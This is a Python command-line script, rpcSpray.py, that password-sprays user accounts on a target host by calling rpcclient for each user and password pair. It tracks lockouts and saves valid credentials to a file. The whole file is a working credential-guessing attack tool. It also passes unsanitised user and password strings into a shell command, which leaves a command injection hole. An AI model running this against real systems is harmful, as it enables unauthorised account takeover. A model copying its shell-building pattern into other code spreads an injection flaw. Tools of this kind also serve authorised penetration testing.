#! python3
# rpcSpray.py -v 1.0
# Author- David Sullivan
#
# Use rpcclient to password spray against a device
#
# Revision  1.0     -   05/18/2018- Initial creation of script
#
# To do:
#   -   Add in time delay feature
#
# Example Usage:
# python3 rpcSpray.py -u user -p password -t 127.0.0.1 -o output.txt
# python3 rpcSpray.py -U userlist.txt -P passwordlist.txt -t 127.0.0.1 -o output.txt

import subprocess, argparse


def write_output(user, password, output):
    # open the file and write to it
    file = open(output, 'a+')
    file.write('%s:%s\n' % (user, password))
    file.close()


def sprayer(user_list, password_list, target_ip, output):
    # loop through each set of passwords, spraying each user
    print("Running")
    # remove the new line character from the users
    user_list_clean = []
    for user in user_list:
        user = user.replace("\n", "")
        user_list_clean.append(user)
    # remove the new line character from the passwords
    password_list_clean = []
    for password in password_list:
        password = password.replace("\n", "")
        password_list_clean.append(password)

    # create a copy of the user list to remove users if the correct password is found, or the account gets locked
    temp_users = user_list_clean[:]
    for password in password_list_clean:
        print("Spraying using %s" % password)
        # update the user_list based on found passwords or locked accounts
        user_list = temp_users[:]
        for user in user_list:
            # build the command line argument for rpcclient
            arguments = 'rpcclient -U "%s%%%s" -c "getusername;quit" %s' % (user, password, target_ip)
            # send the command line query and pipe the response to standard out
            response = subprocess.Popen(arguments, shell=True, stdout=subprocess.PIPE).stdout
            # decode the response as a string
            answer = (response.read()).decode()
            # check to see if the server can be connected to, if not, stop the script
            if answer == "Cannot connect to server.  Error was NT_STATUS_UNSUCCESSFUL\n":
                print("Unable to connect to server")
                quit()
            # check to see if the account is locked out, if so, print out the account and remove from spraying list
            elif answer == "Cannot connect to server.  Error was NT_STATUS_ACCOUNT_LOCKED_OUT\n":
                print(answer.replace("\n", "") + " using the account " + user)
                temp_users.remove(user)
            # if logon fails, drop the response, any other response, print to screen and remove account from spraying
            elif answer != "Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE\n":
                print(answer.replace("\n", "") + " using the password " + password + " and the account " + user)
                temp_users.remove(user)
                # write password to file
                if output is not None:
                    write_output(user, password, output)
    print("Complete")


def main():
    # parse input for variables
    parser = argparse.ArgumentParser(description='RPC Password Sprayer')
    parser.add_argument('-U', '--userlist', help='Location of users list')
    parser.add_argument('-u', '--user', help='Use a single user name')
    parser.add_argument('-P', '--passwordlist', help='Location of passwords list')
    parser.add_argument('-p', '--password', help='Use a single password')
    parser.add_argument('-t', '--target', help='Target IP address')
    parser.add_argument('-o', '--output', help='Target IP address')
    args = parser.parse_args()

    # set list of users
    users = []
    if args.userlist is not None:
        users_doc = args.userlist
        users_import = open(users_doc, 'r')
        for usr in users_import:
            users.append(usr)
    if args.user is not None:
        users.append(args.user)

    # set list of passwords
    passwords = []
    if args.passwordlist is not None:
        passwords_doc = args.passwordlist
        passwords_import = open(passwords_doc, 'r')
        for pw in passwords_import:
            passwords.append(pw)
    if args.password is not None:
        passwords.append(args.password)

    # select target
    target = args.target

    # select output
    if args.output is not None:
        output = args.output
    else:
        output = None

    # run the program
    sprayer(users, passwords, target, output)


main()
